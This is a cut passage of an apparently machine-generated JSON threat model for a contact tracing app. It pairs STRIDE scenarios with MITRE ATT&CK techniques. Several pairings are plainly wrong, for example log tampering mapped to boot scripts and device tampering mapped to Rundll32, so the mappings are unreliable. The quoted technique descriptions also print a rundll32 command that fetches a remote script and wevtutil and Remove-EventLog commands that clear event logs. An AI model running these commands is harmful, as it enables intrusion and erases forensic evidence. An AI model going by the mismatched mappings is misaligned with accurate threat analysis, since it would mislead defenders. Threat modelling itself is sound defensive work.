                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "10",
    "batch_number": "8",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could create a fake contact tracing app that mimics the legitimate app.",
            "Assumptions": [
                {
                    "Assumption": "Users cannot distinguish between legitimate and fake apps.",
                    "Role": "User",
                    "Condition": "Presence of deceptive fake app in app stores."
                },
                {
                    "Assumption": "Attackers have the means to distribute the fake app widely.",
                    "Role": "Attacker",
                    "Condition": "Attackers can upload apps to stores or trick users into side-loading."
                },
                {
                    "Assumption": "Users assume any app with correct branding is trustworthy.",
                    "Role": "User",
                    "Condition": "Users do not verify app authenticity beyond appearance."
                }
            ],
            "Potential Impact": "Unauthorized access to user data and potential spread of misinformation.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "spoofing",
                "mobile device",
                "application"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could inject false Bluetooth or GPS signals to spoof proximity to infected individuals.",
            "Assumptions": [
                {
                    "Assumption": "The app relies on Bluetooth or GPS signals for proximity sensing.",
                    "Role": "System",
                    "Condition": "Proximity is determined by signal presence."
                },
                {
                    "Assumption": "Devices do not verify the authenticity of received signals.",
                    "Role": "Device",
                    "Condition": "Devices accept all received signals as valid."
                },
                {
                    "Assumption": "Users assume all exposure notifications are accurate.",
                    "Role": "User",
                    "Condition": "Users trust the application's calculated proximities."
                }
            ],
            "Potential Impact": "False alerts, unnecessary quarantines, and erosion of trust in the system.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "Bluetooth",
                "GPS"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains access to the central server (in centralized architecture) and issues fake infection notifications.",
            "Assumptions": [
                {
                    "Assumption": "Central server issues notifications based on received data.",
                    "Role": "Server",
                    "Condition": "Server processes and sends notifications."
                },
                {
                    "Assumption": "The server does not have robust authentication and authorization mechanisms.",
                    "Role": "Server",
                    "Condition": "Weak security controls on the server."
                },
                {
                    "Assumption": "Users trust notifications from the central server.",
                    "Role": "User",
                    "Condition": "Users accept server-issued notifications as trustworthy."
                }
            ],
            "Potential Impact": "Mass misinformation, panic, and potential system-wide distrust.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "server",
                "notification",
                "centralized architecture"
            ],
            "mitre_technique": {
                "name": "Acquire Infrastructure",
                "description": "Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.(Citation: TrendmicroHideoutsLease) Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.(Citation: Free Trial PurpleUrchin) Additionally, botnets are available for rent or purchase.\n\nUse of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to support [Proxy](https://attack.mitre.org/techniques/T1090), including from residential proxy services.(Citation: amnesty_nso_pegasus)(Citation: FBI Proxies Credential Stuffing)(Citation: Mandiant APT29 Microsoft 365 2022) Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
                "id": "attack-pattern--0458aab9-ad42-4eac-9e22-706a95bafee2",
                "technique_id": "T1583"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker intercepts and modifies data packets exchanged between user devices in the centralized architecture.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not secured (e.g., lack of encryption).",
                    "Role": "System",
                    "Condition": "Data packets are transmitted in plaintext."
                },
                {
                    "Assumption": "Attackers have access to the same network as the victims.",
                    "Role": "Attacker",
                    "Condition": "Shared network environment or compromised network devices."
                },
                {
                    "Assumption": "No integrity checks are in place.",
                    "Role": "System",
                    "Condition": "Absence of integrity verification mechanisms."
                }
            ],
            "Potential Impact": "Corruption of data, leading to inaccurate contact tracing results.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data packet",
                "network",
                "centralized architecture"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker maliciously modifies log files on the central or service server to cover their tracks.",
            "Assumptions": [
                {
                    "Assumption": "Log files are critical for post-incident analysis.",
                    "Role": "System",
                    "Condition": "Logs contain traceable records of actions."
                },
                {
                    "Assumption": "Logs are not regularly monitored or protected.",
                    "Role": "System",
                    "Condition": "Logs are stored without frequent checks or security controls."
                },
                {
                    "Assumption": "The attacker has sufficient privileges to modify logs.",
                    "Role": "Attacker",
                    "Condition": "Privileged access to server or log files."
                }
            ],
            "Potential Impact": "Loss of forensic capabilities and potential for undetected malicious activity.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "log files",
                "server",
                "privileged access"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An authorized user manipulates their own device's data to trigger false alerts or conceal exposures.",
            "Assumptions": [
                {
                    "Assumption": "Users have access to software or tools to modify app data.",
                    "Role": "User",
                    "Condition": "Availability of tampering tool or rooted device."
                },
                {
                    "Assumption": "The app does not have anti-tampering mechanisms.",
                    "Role": "System",
                    "Condition": "Absence of data integrity checks on the device."
                },
                {
                    "Assumption": "False data can be submitted without detection.",
                    "Role": "System",
                    "Condition": "Lack of data validation processes."
                }
            ],
            "Potential Impact": "Manipulation of exposure data, leading to false positives or negatives.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "device",
                "data integrity",
                "user"
            ],
            "mitre_technique": {
                "name": "Rundll32",
                "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) ",
                "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
                "technique_id": "T1218.011"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having received or triggered a contact tracing alert despite the data indicating otherwise.",
            "Assumptions": [
                {
                    "Assumption": "Alerts and data are not logged or are anonymized to preserve privacy.",
                    "Role": "System",
                    "Condition": "Application prioritizes privacy over non-repudiation."
                },
                {
                    "Assumption": "Users are able to delete or alter their local data.",
                    "Role": "User",
                    "Condition": "Users have control over their device data."
                },
                {
                    "Assumption": "There is no dispute resolution mechanism in place.",
                    "Role": "System",
                    "Condition": "No procedures for verifying disputes."
                }
            ],
            "Potential Impact": "Failures in exposure notification, leading to gaps in contact tracing effectiveness.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "alert",
                "log",
                "device"
            ],
            "mitre_technique": {
                "name": "Email Hiding Rules",
                "description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)\n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
                "id": "attack-pattern--0cf55441-b176-4332-89e7-2c4c7799d0ff",
                "technique_id": "T1564.008"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious actor reloads positive test data into the system, denying their involvement and falsely implicating others.",
            "Assumptions": [
                {
                    "Assumption": "System logs are not tamper-proof or timestamped.",
                    "Role": "System",
                    "Condition": "Logs have no protection against tampering."
                },
                {
                    "Assumption": "Unique identifiers are not used robustly to differentiate real and false positives.",
                    "Role": "System",
                    "Condition": "Weakness in unique ID generation and validation."
                },
                {
                    "Assumption": "Alert issuance relies solely on received data.",
                    "Role": "System",
                    "Condition": "Notifications are sent without additional validation."
                }
            ],
            "Potential Impact": "False alerts and potential distrust among infected and non-infected users.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "test data",
                "alert",
                "server"
            ],
            "mitre_technique": {
                "name": "Boot or Logon Initialization Scripts",
                "description": "Adversaries may use scripts automatically executed at boot or logon initialization to establish persistence.(Citation: Mandiant APT29 Eye Spy Email Nov 22)(Citation: Anomali Rocke March 2019) Initialization scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server. These scripts can vary based on operating system and whether applied locally or remotely.  \n\nAdversaries may use these scripts to maintain persistence on a single system. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary. \n\nAn adversary may also be able to escalate their privileges since some boot or logon initialization scripts run with higher privileges.",
                "id": "attack-pattern--03259939-0b57-482f-8eb5-87c0e0d54334",
                "technique_id": "T1037"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Healthcare workers deny having submitted positive test results to the centralized server, blaming the system for false information.",
            "Assumptions": [
                {
                    "Assumption": "Healthcare workers are human and may make mistakes or have malicious intent.",
                    "Role": "Healthcare Worker",
                    "Condition": "Potential for human error or malicious action."
                },
                {
                    "Assumption": "Positive tests are not verified through independent processes.",
                    "Role": "System",
                    "Condition": "Data validation is weak."
                },
                {
                    "Assumption": "The system does not log actions with enough detail to deter denial.",
                    "Role": "System",
                    "Condition": "Inadequate logging mechanisms."
                }
            ],
            "Potential Impact": "Breakdown in trust between users and system, reducing overall effectiveness.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "test result",
                "centralized server",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive contact data is leaked from the central server due to inadequate access controls.",
            "Assumptions": [
                {
                    "Assumption": "Central server stores user contact and health data.",
                    "Role": "System",
                    "Condition": "Contact and health data stored centrally."
                },
                {
                    "Assumption": "Access controls are not stringent.",
                    "Role": "System",
                    "Condition": "Weak or improperly configured access controls."
                },
                {
                    "Assumption": "Attackers can breach the server to access data.",
                    "Role": "Attacker",
                    "Condition": "Server vulnerabilities or weak defenses."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive health data, leading to privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "central server",
                "data breach",
                "access control"
            ],
            "mitre_technique": {
                "name": "Windows File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).",
                "id": "attack-pattern--34e793de-0274-4982-9c1a-246ed1c19dee",
                "technique_id": "T1222.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Intercepted Bluetooth or GPS data during transmission from user devices reveals user locations and interactions.",
            "Assumptions": [
                {
                    "Assumption": "Transmission over Bluetooth/GPS is unencrypted.",
                    "Role": "System",
                    "Condition": "Data sent without encryption."
                },
                {
                    "Assumption": "Attackers can eavesdrop on communications.",
                    "Role": "Attacker",
                    "Condition": "Shared or compromised network environments."
                },
                {
                    "Assumption": "Bluetooth/GPS signals are consistent with real locations and timings.",
                    "Role": "System",
                    "Condition": "Accurate location and interaction data."
                }
            ],
            "Potential Impact": "Exposure of user locations and interaction history.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "Bluetooth",
                "GPS",
                "eavesdropping"
            ],
            "mitre_technique": {
                "name": "Exfiltration Over Bluetooth",
                "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\n\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
                "id": "attack-pattern--613d08bc-e8f4-4791-80b0-c8b974340dfd",
                "technique_id": "T1011.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider with access to system logs extracts and shares sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have access to logs containing sensitive data.",
                    "Role": "Insider",
                    "Condition": "Privileged access to logs."
                },
                {
                    "Assumption": "Logs are not anonymized or encrypted.",
                    "Role": "System",
                    "Condition": "Logs stored in plaintext or easily decipherable form."
                },
                {
                    "Assumption": "No monitoring or alerts for suspicious access to logs.",
                    "Role": "System",
                    "Condition": "Lack of security monitoring controls."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive user interactions and health status.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider threat",
                "log access",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A distributed denial of service (DDoS) attack targets the central server, overwhelming it and preventing legitimate users from receiving critical exposure alerts.",
            "Assumptions": [
                {
                    "Assumption": "Central server manages critical functions in centralized architecture.",
                    "Role": "System",
                    "Condition": "Server-centralized operations."
                },
                {
                    "Assumption": "Server is exposed to the internet without adequate DDoS protection.",
                    "Role": "System",
                    "Condition": "Lack of robust DDoS mitigation."
                },
                {
                    "Assumption": "Attackers deploy a large network of compromised devices for the attack.",
                    "Role": "Attacker",
                    "Condition": "Availability of botnets or similar resources."
                }
            ],
            "Potential Impact": "Disruption of service, preventing users from receiving timely notifications.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "central server",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Excessive false-positive alerts generated by a compromised device flood the server, reducing its capacity to process genuine alerts.",
            "Assumptions": [
                {
                    "Assumption": "Compromised device can communicate with the central server.",
                    "Role": "Device",
                    "Condition": "Connected and communicating device."
                },
                {
                    "Assumption": "The server does not have rate limiting or anomaly detection.",
                    "Role": "System",
                    "Condition": "Lack of controls to detect/report anomalies."
                },
                {
                    "Assumption": "Compromised device generates alerts without validation.",
                    "Role": "System",
                    "Condition": "Absence of robust validation mechanisms."
                }
            ],
            "Potential Impact": "Server overload, delaying or preventing legitimate exposure notifications.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "false positive",
                "server",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A ransomware attack encrypts data on the central server, blocking access to critical contact tracing data.",
            "Assumptions": [
                {
                    "Assumption": "Central server stores critical data.",
                    "Role": "System",
                    "Condition": "Centralized data storage."
                },
                {
                    "Assumption": "Server lacks adequate anti-ransomware protections.",
                    "Role": "System",
                    "Condition": "Weak security controls or outdated software."
                },
                {
                    "Assumption": "Attackers gain access to the server to deploy ransomware.",
                    "Role": "Attacker",
                    "Condition": "Successful exploitation of vulnerabilities."
                }
            ],
            "Potential Impact": "Loss of access to data, hindering contact tracing efforts.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "ransomware",
                "central server",
                "data encryption"
            ],
            "mitre_technique": {
                "name": "Data Encrypted for Impact",
                "description": "Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018)\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222) or [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529), in order to unlock and/or gain access to manipulate these files.(Citation: CarbonBlack Conti July 2020) In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017) \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin 